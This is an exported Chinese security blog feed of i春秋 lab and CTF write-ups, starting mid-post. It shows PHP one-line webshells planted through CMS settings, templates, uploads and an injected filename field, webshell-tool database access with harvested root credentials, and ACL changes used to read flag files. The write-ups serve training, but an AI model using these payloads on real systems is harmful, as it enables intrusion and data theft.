<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/login-back.png" alt="login-back"></p>
<p>依次点击 <strong>系统功能 -&gt; 全局参数设置</strong>，在 <strong>网页底部版权信息</strong> 中写入一句话木马 <code>&lt;?php @assert($_POST[&#39;cmd&#39;]); ?&gt;</code> 后保存设置：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/copyright.png" alt="copyright"></p>
<p>这里为什么不用传统的一句话木马 <code>&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;</code> 呢？因为 CMS 对 <code>eval()</code> 函数进行了过滤，会将其转变成 <code>eva l()</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/copyright-fail.png" alt="copyright-fail"></p>
<p>所以此处能用 <code>assert()</code> 函数写入木马，也体现了 CMS 的写入过滤不完全。接着点击 <strong>系统功能 -&gt; 频道独立页管理 -&gt; 添加频道页</strong>，在 <strong>频道页名字</strong> 处填上任意字符（此处以 <code>sqli</code> 为例），在 <strong>静态文件名</strong> 处必须填上 <code>.php</code> 文件名，否则菜刀连接不上（此处以 <code>sqli.php</code> 为例）：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/channel.png" alt="channel"></p>
<p>点击 <strong>提交</strong> 后，可在 <strong>频道管理页</strong> 中看到所添加的频道页，接下来一定要点击 <strong>静态化</strong> 按钮，才能正常访问 <code>http://www.test.ichunqiu/sqli.php</code>，否则只会弹出 404 页面：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/staticize.png" alt="staticize"></p>
<p>在确认能够正常 <code>sqli.php</code> 页面后，准备 <strong>添加SHELL</strong> 进行菜刀连接：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/chopper-sqli.png" alt="chopper-sqli"></p>
<p>成功连接后，在管理员桌面上看到了 flag 文件：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/flag-sqli.png" alt="flag-sqli"></p>
<p>打开 flag 文件即可获得 <code>key&#123;636bb37e&#125;</code>，因此第 2 题答案就是 <code>636bb37e</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/flag.png" alt="flag"></p>
<h2 id="前台栏目投稿自定义文件名写入木马"><a href="#前台栏目投稿自定义文件名写入木马" class="headerlink" title="前台栏目投稿自定义文件名写入木马"></a>前台栏目投稿自定义文件名写入木马</h2><p>第二个漏洞是在前台栏目投稿设置信息中的 <strong>自定义文件名</strong> 输入框内触发，因此需要“自定义内容页文件名”的权限，不过我们已经有了管理员权限，故不必担心此问题。详情可参考：</p>
<blockquote>
<p><a href="https://www.secpulse.com/archives/30557.html">齐博CMS某处任意文件写入getshell（需要一定权限）</a></p>
</blockquote>
<p>首先用账号 <code>admin</code> 与密码 <code>whoami!@#123</code> 在前台登录，并点击 <strong>！我要投稿</strong>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/login-front.png" alt="login-front"></p>
<p>任选一栏目，在 <strong>我要投稿</strong> 处点击 <strong>发表</strong>（此处以<strong>社会新闻</strong>栏目为例）：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/contribute-select.png" alt="contribute-select"></p>
<p>先在 <strong>其他设置</strong> 标签页下的 <strong>自定义文件名</strong> 输入框中写入木马 <code>x&#39;;@assert($_POST[&#39;cmd&#39;]);//y.htm</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/contribute-setting.png" alt="contribute-setting"></p>
<p>其中 <code>x&#39;;</code>是为了闭合代码中的左单引号，<code>//y.htm</code> 是为了使整体文件名有静态网页的后缀，并且注释掉后面的代码。注意此处不能用 <code>eval()</code> 函数构造木马，与前文一样会被过滤。</p>
<p>再回到 <strong>基本信息</strong> 标签页下，将带 <code>(*)</code> 的必填信息填好后提交：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/contribute-info.png" alt="contribute-info"></p>
<p>提交后访问 <code>http://www.test.ichunqiu/data/showhtmltype.php</code>，成功看到报错信息：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/contribute-error.png" alt="contribute-error"></p>
<p>接下来 <strong>添加SHELL</strong> 进行菜刀连接：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/chopper-showhtmltype.png" alt="chopper-showhtmltype"></p>
<p>成功连接后，可在 <code>/data/showhtmltype.php</code> 源码中看到所添加的木马，印证了漏洞的存在：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/contribute-source.png" alt="contribute-source"></p>
<p>查看管理员桌面上的 flag 文件与前文一致，此处不再赘述。</p>
<h1 id="0x03-获取-bbs-test-ichunqiu-数据库中-admin-的-salt-值"><a href="#0x03-获取-bbs-test-ichunqiu-数据库中-admin-的-salt-值" class="headerlink" title="0x03 获取 bbs.test.ichunqiu 数据库中 admin 的 salt 值"></a>0x03 获取 bbs.test.ichunqiu 数据库中 admin 的 salt 值</h1><p>第 3 题终于引入了 <code>http://bbs.test.ichunqiu</code> 论坛社区…的数据库了。出题人好像为了方便我们直接进行本题，特意在主站根目录下放了木马 <code>/2.php</code>，免去了上题插入木马的过程：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/trojan.png" alt="trojan"></p>
<p>所以下次想直接复现第 3 题，用菜刀连上此木马即可：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/chopper-trojan.png" alt="chopper-trojan"></p>
<p>我们在根目录下可看到 <code>/dedecms_bak</code> 的文件夹，进一步搜索到 DEDECMS 的<a href="https://zhidao.baidu.com/question/1882828001505455828.html">默认数据库配置文件</a>为 <code>/data/common.inc.php</code>，打开一看，果不其然：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/dedecms-config.png" alt="dedecms-config"></p>
<p>但是主机地址显示为 <code>172.16.12.3</code>，跟 <code>http://bbs.test.ichunqiu</code> 好像没什么关系吧？其实不然，打开主机终端，用 <code>nslookup</code> 命令可得到论坛的 IP 地址就是 <code>172.16.12.3</code>，顺便可看到主站的 IP 地址为  <code>172.16.12.2</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/nslookup.png" alt="nslookup"></p>
<p>注意到数据库配置信息中是根用户权限，因此若能连上 DEDECMS 在 <code>172.16.12.3</code> 上的数据库，那么 Discuz! 在 <code>172.16.12.3</code> 上的数据库也能被访问到！于是，在菜刀 <strong>添加SHELL</strong> 的配置中填入数据库信息<strong>（THUPL）</strong>：</p>
<blockquote>
<p>小贴士：如何在菜刀中填入数据库配置信息请参考 <a href="http://www.daixiaorui.com/read/17.html">黑站利器-中国菜刀的功能介绍和使用方法</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;T&gt;mysql&lt;/T&gt;</span><br><span class="line">&lt;H&gt;172.16.12.3&lt;/H&gt;</span><br><span class="line">&lt;U&gt;root&lt;/U&gt;</span><br><span class="line">&lt;P&gt;opiznmzs&amp;**(&lt;/P&gt;</span><br><span class="line">&lt;L&gt;gbk&lt;/L&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/chopper-bbs.png" alt="chopper-bbs"></p>
<p>保存设置后右键条目，选择 <strong>数据库管理</strong>，成功连接后可见服务器端的数据库管理界面：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/chopper-db.png" alt="chopper-db"></p>
<p>又经过一番搜索，得知 <code>ultrax</code> 正是 Discuz! 的数据库，而 <code>dedecms</code> 显而易见是 DEDECMS 的。我们的目标应该是 <code>ultrax</code> 数据库中某个表的 <code>salt</code> 字段，这里必须要介绍一下 MySQL 自带的 <code>information_schema</code> 数据库，它提供了对元数据的访问方式，是 MySQL 中的百科全书，其中在 <code>information_schema.COLUMNS</code> 表中记录了本数据库所有字段的相关信息。详情可参考：</p>
<blockquote>
<p><a href="http://blog.csdn.net/u014639561/article/details/51579161">MySQL中information_schema是什么</a></p>
</blockquote>
<p>因此，只要输入一条简单的 SQL 语句，点击 <strong>执行</strong>，有关 <code>salt</code> 字段的所有信息将会呈现：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> COLUMNS <span class="keyword">WHERE</span> COLUMN_NAME <span class="operator">=</span> <span class="string">&#x27;salt&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/chopper-search.png" alt="chopper-search"></p>
<p>最终我们在 <code>ultrax</code> 数据库的 <code>pre_ucenter_members</code> 表中发现了 <code>salt</code> 字段的值为 <code>9b47b6</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/chopper-salt.png" alt="chopper-salt"></p>
<p>到此为止，本次渗透测试的指定任务已达成。</p>
<p>意犹未尽的各位看官可接着往下看，既然我们把 <code>172.16.12.3</code> 上的数据库给爆了，那也趁此机会，不妨把 <code>172.16.12.2</code> 上的数据库也给爆了。经过搜索后发现，齐博 CMS 的<a href="https://zhidao.baidu.com/question/252236807.html">默认数据库配置文件</a>为 <code>/data/mysql_config.php </code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/qibo-config.png" alt="qibo-config"></p>
<p>然后在菜刀 <strong>添加SHELL</strong> 的配置中修改数据库信息：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/chopper-www.png" alt="chopper-www"></p>
<p>成功连接后，在 <code>qibov7</code> 数据库的 <code>qb_members</code> 表中发现第 1 题中管理员的账号与密码哈希值：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/chopper-qibo.png" alt="chopper-qibo"></p>
<p>至此，本题两个服务器中的数据库系统已被我们打穿。还想继续深挖的朋友，建议去尝试获得论坛社区的 webshell，并通过提权获得两个服务器系统的最高权限，达到完全控制的最终目的。</p>
<h1 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h1><p>本题虽然有两台目标服务器，但万变不离其宗，熟练之后自然得心应手。在此过程中，我同样也受益匪浅，细心的读者会发现全文多次出现<strong>『搜索』</strong>二字，而渗透测试的核心正是<strong>收集目标系统的信息，挖掘其漏洞并加以利用</strong>。</p>
<blockquote>
<p>小贴士：关于本系列渗透的练习方法，建议先自己动手做，用尽你毕生所学，实在卡住无法继续时（比如规定在半小时内），再翻看 writeup，把当前的困难点看懂后就不要往下看了。接着按上述流程一直往下做，直至完成渗透目标。</p>
</blockquote>
<p>以上是笔者之拙见，不足之处还望各位指出，有其他更猥琐的渗透的思路欢迎前来交流。最后向以下参考 writeup 的作者表示致谢！</p>
<blockquote>
<p><a href="https://bbs.ichunqiu.com/thread-29259-1-1.html">11-在线挑战详细攻略-《渗透测试笔记》</a></p>
</blockquote>
]]></content>
      <categories>
        <category>InfoSec</category>
        <category>Pentest</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
        <tag>Web</tag>
        <tag>PHP</tag>
        <tag>Crypto</tag>
        <tag>i春秋</tag>
        <tag>Pentest</tag>
        <tag>Exploit</tag>
        <tag>CMS</tag>
        <tag>SQLi</tag>
        <tag>Trojan</tag>
        <tag>Vulnerability</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title>【i春秋】渗透测试入门 —— 真的很简单</title>
    <url>/2018/03/06/ichunqiu-pentest-introduction-really-simple/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本题是渗透测试入门的一道基础题，虽然美其名曰“真的很简单”，但对于新手还是有一定挑战性的，实践并掌握本题中的所有知识点，对渗透测试的基本理解有很大帮助。</p>
<p>此题的目标是对一个<strong>基于<a href="http://www.dedecms.com/">织梦 CMS</a> 的网站</strong>进行渗透测试，找到网站登录后台，继而入侵服务器找到存放 flag 的文件。从实验手册上，可看出其中还会涉及到简单的提权过程。</p>
<ul>
<li>题目链接：<a href="https://www.ichunqiu.com/battalion?t=2&r=54399">https://www.ichunqiu.com/battalion?t=2&r=54399</a></li>
<li>解题链接：<a href="https://www.ichunqiu.com/vm/51123/1">https://www.ichunqiu.com/vm/51123/1</a></li>
</ul>
<span id="more"></span>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-really-simple/guide.png" alt="guide"></p>
<h1 id="0x01-网站管理员的密码是多少？"><a href="#0x01-网站管理员的密码是多少？" class="headerlink" title="0x01 网站管理员的密码是多少？"></a>0x01 网站管理员的密码是多少？</h1><p>第 1 题相对简单，在实验环境内根据提示打开下载链接 <code>http://file.ichunqiu.com/49ba59ab</code>，接着下载爆破工具 <code>dedecms.exe</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-really-simple/dedecms-download.png" alt="dedecms-download"></p>
<p>打开工具，输入目标 URL，一键爆破得到管理员的账号 <code>ichunqiu</code> 与密码哈希值 <code>adab29e084ff095ce3eb</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-really-simple/dedecms.png" alt="dedecms"></p>
<p>仔细数数，发现密码哈希值是 20 位的（注：此处的“位”均为十六进制，而非二进制），上网一查才发现这是织梦 CMS 的特性，实现过程可参考 <a href="http://www.jb51.net/cms/104721.html">DEDECMS的20位MD5加密密文解密示例介绍</a>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-really-simple/dedecms-md5.png" alt="dedecms-md5"></p>
<p>将 20 位的哈希值用 <a href="http://www.dmd5.com/md5-decrypter.jsp">MD5解密工具</a> 解密，得到密码明文 <code>only_system</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-really-simple/password.png" alt="password"></p>
<p>为验证 20 位的 MD5 哈希算法规则，可进一步用 <a href="https://md5jiami.51240.com/">MD5加密工具</a> 对 <code>only_system</code> 加密，发现其 16 位哈希值确实能由 20 位哈希值去掉前 3 位与后 1 位所得:</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-really-simple/password-verify.png" alt="password-verify"></p>
<h1 id="0x02-网站后台目录名是什么？"><a href="#0x02-网站后台目录名是什么？" class="headerlink" title="0x02 网站后台目录名是什么？"></a>0x02 网站后台目录名是什么？</h1><p>第 2 题上来先尝试织梦 CMS 的默认后台路径 <code>/dede/index.php</code> 或 <code>/dede/login.php</code>，得到 404 的结果也是意料之中，即现在的问题是要找出修改后的后台目录名。</p>
<p>打开实验工具箱，发现【目录扫描】文件夹，以【御剑后台扫描工具】为例，对目标 URL 扫描后得到如下结果：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-really-simple/directory-scan.png" alt="directory-scan"></p>
<p>注意，为了保证扫描效率，一般后台扫描工具都是采用字典扫描，而不是暴力穷举，因此<strong>不同扫描器得到的结果不完全相同，尽可能使用多种扫描器，偏僻怪异的名字可能扫描不出来</strong>。</p>
<p>笔者采用了多种扫描器，并对其可能的结果进行验证，都一无所获，即可<strong>判断此后台目录名具有较强的个性或随机性</strong>。</p>
<p>所以要转换思路，看看织梦 CMS 是否存在后台地址信息泄露的漏洞。果不其然，发现从报错文件 <code>/data/mysql_error_trace.inc</code> 或 <code>/data/mysqli_error_trace.inc</code> 中，可得到泄露的后台路径，具体可参考：</p>
<blockquote>
<p><a href="http://blog.csdn.net/wangyi_lin/article/details/9286937">dedecms的各种卡哇伊小漏洞</a><br><a href="http://www.cnblogs.com/hookjoy/p/6996820.html">dedecms(织梦)漏洞&amp;exp整理</a><br><a href="http://www.daixiaorui.com/read/14.html">php学习之织梦dedecms漏洞讲解</a></p>
</blockquote>
<p>最后在 <code>/data/mysqli_error_trace.inc</code> 中获得后台目录名为 <code>lichunqiul</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-really-simple/mysqli-error-trace.png" alt="mysqli-error-trace"></p>
<p>对其进行验证，终于看到了后台登录页面：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-really-simple/login.png" alt="login"></p>
<h1 id="0x03-管理员桌面中-flag-文件信息是？"><a href="#0x03-管理员桌面中-flag-文件信息是？" class="headerlink" title="0x03 管理员桌面中 flag 文件信息是？"></a>0x03 管理员桌面中 flag 文件信息是？</h1><p>用账号 <code>ichunqiu</code> 与密码 <code>only_system</code> 登录后台后，根据实验手册，要想办法利用<a href="http://www.zhongguocaidao.com/">中国菜刀</a>连接服务器，获得 webshell，进而查看 flag 文件中的信息。</p>
<h2 id="获取-webshell"><a href="#获取-webshell" class="headerlink" title="获取 webshell"></a>获取 webshell</h2><p>首先我们需要在服务器插入<a href="https://baike.baidu.com/item/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC">一句话木马</a>，然后才能用菜刀连接，获得 webshell。这里介绍两种插入一句话木马的方法。</p>
<h3 id="直接修改模板-PHP-源码"><a href="#直接修改模板-PHP-源码" class="headerlink" title="直接修改模板 PHP 源码"></a>直接修改模板 PHP 源码</h3><p>依次点击 <strong>模板 -&gt; 标签源码管理</strong>，以编辑第一个模板 <code>adminname.lib.php</code> 为例：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-really-simple/template-list.png" alt="template-list"></p>
<p>在模板源码第一行插入一句话木马 <code>&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-really-simple/template-edit.png" alt="template-edit"></p>
<p>接着在工具箱【webshell】文件夹打开【中国菜刀】：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-really-simple/chopper.png" alt="chopper"></p>
<p>在 <strong>添加SHELL</strong> 输入框中，输入被插入木马模板文件的地址 <code>http://www.test.ichunqiu/include/taglib/adminname.lib.php</code>，其右侧填入木马中接收 POST 请求数据的 key 字段 <code>cmd</code>，脚本类型为 <code>PHP(Eval)</code>，字符编码为 <code>GB2312</code>，设置完成后点击 <strong>添加</strong>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-really-simple/add-shell-1.png" alt="add-shell-1"></p>
<p>若参数设置正确，双击所添加的条目，即可连接服务器的资源管理器，进入到模板文件所在的目录：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-really-simple/manager-1.png" alt="manager-1"></p>
<h3 id="上传一句话木马文件"><a href="#上传一句话木马文件" class="headerlink" title="上传一句话木马文件"></a>上传一句话木马文件</h3><p>先在本地创建文件 <code>trojan.php</code>，写入一句话木马 <code>&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-really-simple/trojan-edit.png" alt="trojan-edit"></p>
<p>再依次点击 <strong>系统 -&gt; 系统基本参数 -&gt; 附件设置</strong>，如下图更改允许上传的文件类型，否则木马将上传失败：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-really-simple/file-type.png" alt="file-type"></p>
<p>最后点击 <strong>核心 -&gt; 上传新文件</strong>，如下图所示上传木马：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-really-simple/trojan-upload.png" alt="trojan-upload"></p>
<p>上传完毕后点击 <strong>核心 -&gt; 附件数据管理 -&gt; 更改</strong>，即可查看木马的路径：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-really-simple/trojan-path.png" alt="trojan-path"></p>
<p>接着利用菜刀添加SHELL，步骤同上，只不过地址更改为 <code>http://www.test.ichunqiu/uploads/soft/180307/1_1503138291.php</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-really-simple/add-shell-2.png" alt="add-shell-2"></p>
<p>若参数设置正确，双击连接服务器的资源管理器，即可进入到木马所上传的目录：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-really-simple/manager-2.png" alt="manager-2"></p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>进入到管理员桌面可看到 flag 文件 <code>flag~ichunqiu.txt</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-really-simple/manager-flag.png" alt="manager-flag"></p>
<p>但双击后未显示任何内容，估计是权限受限。接下来可右键点击条目，祭出虚拟终端，即 webshell 的命令行模式：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-really-simple/chopper-terminal.png" alt="chopper-terminal"></p>
<p>先切换至管理员桌面，用 <code>cacls</code> 命令查看 flag 文件的<a href="https://baike.baidu.com/item/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8">访问控制列表（ACL）</a>，后用 <code>whoami</code> 命令查看用户名，发现 <code>authority\system</code> 用户对于 flag 文件的权限是 N，即无权限，用 <code>type</code> 命令查看 flag 文件果然是拒绝访问的：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-really-simple/deny.png" alt="deny"></p>
<p>用 <code>cacls</code> 命令更改了访问权限后，<code>authority\system</code> 用户对于 flag 文件的权限变成了 F，即所有权限，再次查看 flag 文件内容即可看到 <code>key&#123;il2o3l&#125;</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-really-simple/flag.png" alt="flag"></p>
<p>注意提交答案的时候有个坑，记得先拆掉包装，只需提交 <code>il2o3l</code> 即可。最后附上 <code>cacls</code> 命令的用法：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-really-simple/cacls.png" alt="cacls"></p>
<h1 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h1><p>所谓条条大路通罗马，以上思路可能只是完成目标的其中一种方法。本人能力有限，面对工具箱中种类繁多的各种工具不能信手拈来，对于 Windows 命令的使用也掌握不深，尤其是实验手册中提到的 <code>net.exe</code> 工具尚未使用，因为在 webshell 中使用 <code>net</code> 命令也是拒绝访问的，这个问题还请各位前辈不吝赐教。</p>
<p>最后向以下两篇参考 writeup 的作者表示致谢！</p>
<blockquote>
<p><a href="https://bbs.ichunqiu.com/thread-19282-1-1.html">09-在线挑战详细攻略-《真的很简单》</a><br><a href="https://bbs.ichunqiu.com/thread-15780-1-1.html">爱春秋-WEB渗透实验-真的很简单-实验记录</a></p>
</blockquote>
]]></content>
      <categories>
        <category>InfoSec</category>
        <category>Pentest</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
        <tag>Web</tag>
        <tag>PHP</tag>
        <tag>Crypto</tag>
        <tag>i春秋</tag>
        <tag>Pentest</tag>
        <tag>Exploit</tag>
        <tag>CMS</tag>
        <tag>Trojan</tag>
        <tag>Vulnerability</tag>
        <tag>Privilege</tag>
        <tag>CMD</tag>
      </tags>
  </entry>
  <entry>
    <title>【i春秋】 Web —— 爆破-1</title>
    <url>/2018/08/27/ichunqiu-web-brute-force-1/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>此题出自「百度杯」CTF 比赛 2017 二月场，是第一道 「爆破」系列的 Web 题，考察大家对 PHP <strong>语言特性</strong>的熟练度，难度低，需要的基础知识有：<strong>PHP、正则表达式</strong>。</p>
<p>题目链接在「i春秋」的 CTF 大本营，解题链接通过创建在线靶场后得到：</p>
<ul>
<li>题目链接：<a href="https://www.ichunqiu.com/battalion?t=1&r=57475">https://www.ichunqiu.com/battalion?t=1&r=57475</a></li>
</ul>
<span id="more"></span>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-web-brute-force-1/question.png" alt="question"></p>
<h1 id="0x01-爆破六位变量？"><a href="#0x01-爆破六位变量？" class="headerlink" title="0x01 爆破六位变量？"></a>0x01 爆破六位变量？</h1><p>打开链接，直接看到一段 PHP 源码，是 PHP 代码审计出题的常规手法，只需提交正确的 payload，绕过代码中设置的限制即可：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\w*$/&#x27;</span>,<span class="variable">$a</span> ))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;ERROR&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;var_dump($<span class="subst">$a</span>);&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>由提示可知，flag 是藏在某六位变量中，有的同学一上来就跳进出题人挖的坑里，直接生成字典去爆破变量名。</p>
<p>不要着急，先看看代码第 4 行的变量名匹配规则，是通过<a href="https://en.wikipedia.org/wiki/Regular_expression">正则表达式</a> <code>/^\w*$/</code> 完成的，其中：</p>
<ul>
<li><code>^n</code>：匹配任何开头为 <code>n</code> 的字符串。</li>
<li><code>n$</code>：匹配任何结尾为 <code>n</code> 的字符串。</li>
<li><code>n*</code>：匹配任何包含零个或多个 n 的字符串。 </li>
<li><code>\w</code>：查找单词字符，包括大写字母 <code>A-Z</code>、小写字母 <code>a-z</code>、数字 <code>0-9</code>、下划线 <code>_</code>。</li>
</ul>
<p>理解了匹配规则后，可推出以下两条线索：</p>
<ul>
<li>在没有给任何提示的情况下，PHP 中满足正则表达式的六位变量共有 $53 \times 63^{5} &#x3D; 52,599,136,779$ 种（变量首位不能为数字），每个变量占六字节，至少需要 $52,599,136,779 \times 6 &#x3D; 315,594,820,674 \ B \approx 294 \ GB$ 的存储空间，<strong>用如此大的字典去爆破，普通计算机是无法承受的</strong>。</li>
<li>匹配字符串无限定长度，说明<strong>不一定非要提交六位变量</strong>。</li>
</ul>
<p>入坑的朋友们，赶紧从坑里爬出来，转换一下思路吧！</p>
<h1 id="0x02-超级全局变量-GLOBALS"><a href="#0x02-超级全局变量-GLOBALS" class="headerlink" title="0x02 超级全局变量 $GLOBALS"></a>0x02 超级全局变量 $GLOBALS</h1><p>由第 3 行可知，通过 GET 请求或 POST 请求提交的 <code>hello</code> 参数，将其赋值给 PHP 变量 <code>$a</code>，再到第 7 行的代码执行函数 <a href="http://www.php.net/eval"><code>eval()</code></a> 中，由 <a href="http://php.net/manual/en/function.var-dump.php"><code>var_dump()</code></a> 函数变量的类型、值、结构等信息打印出来。</p>
<blockquote>
<p>小贴士：<code>eval()</code> 函数的执行顺序，是先将变量 <code>$a</code> 解析得到字符串（设为 <code>xxx</code>），再与 <code>$</code> 拼接，最后执行 <code>var_dump($xxx);</code>。详情可参考：<a href="https://ciphersaw.github.io/2017/11/16/%E7%8E%A9%E8%BD%AC%20PHP%20eval%28%29%20%E4%B8%AD%E7%9A%84%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7/">玩转 PHP eval() 中的单双引号</a>。</p>
</blockquote>
<p>既然 flag 存放在某个变量中，这时我们应该想到超级全局变量 <a href="http://php.net/manual/en/reserved.variables.globals.php"><code>$GLOBALS</code></a>，它是一个包含了全局作用域中全部变量的关联数组，变量名即为数组的键值，<strong>注意变量名必须全部大写</strong>。</p>
<p>因此，只需构造 payload <code>hello=GLOBALS</code> 提交 GET 请求，即可获得 flag，同时也看到了传说中的某六位变量 <code>$d3f0f8</code>。</p>
